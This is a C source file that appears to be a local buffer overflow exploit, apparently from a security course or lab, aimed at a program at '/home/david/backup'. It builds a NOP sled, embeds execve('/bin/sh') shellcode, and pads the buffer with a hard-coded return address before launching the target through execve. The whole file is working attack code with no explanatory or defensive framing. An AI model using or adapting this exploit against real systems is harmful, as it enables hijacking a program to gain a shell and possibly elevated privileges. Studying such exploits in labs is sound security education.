#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main(){


   FILE *fp;
   char *arg[4];
   char *env[1];
   int i=0;
   char op[182 + 150] = "";
   char buffer[350];
   int address = 0xffbfdd18;
   char *cp;
   char a[4];
   int buflen = 185;
   char nop[] = "\x90";

   char caddr[4];
   int n;
   arg[0] = "/home/david/backup";
   arg[1] = "backup";
   arg[2] = "foo";
   arg[3] = NULL;
   env[0] = NULL;


   /* add nops*/
   for(i=0; i< buflen- strlen(shellcode); i= i+strlen("\x90")){
       strcat(op,nop);
   }
   /* add shellcode */
   strcat(op,shellcode);

/*
   memcpy(caddr,&address,8);
https://stackoverflow.com/questions/1522994/store-an-int-in-a-char-array
int har = 0x01010101;
char a[4];
a[0] = har & 0xff;
a[1] = (har>>8)  & 0xff;
a[2] = (har>>16) & 0xff;
a[3] = (har>>24) & 0xff;
   cp = (char*)&address;
   for(i=0;i<8;++i){
      caddr[i] = cp[i];
   }
   caddr[7] = '\0';
*/
   for(i=0;i<buflen;++i){
      buffer[i] = op[i];
   }
   for(i=buflen;i<350;i+=4){
      buffer[i] = address & 0xff;
      buffer[i+1] = (address>>8) & 0xff;
      buffer[i+2] = ( address >>16) & 0xff;
      buffer[i+3] = (address >> 24) & 0xff;
   }
   buffer[330]=0;
   printf("length of buffer is %d\n",strlen(buffer));

   arg[2] = buffer;




   if( execve(arg[0],arg,env))
           fprintf(stderr, "execve failed.\n");

   exit(0);

return 0;
}



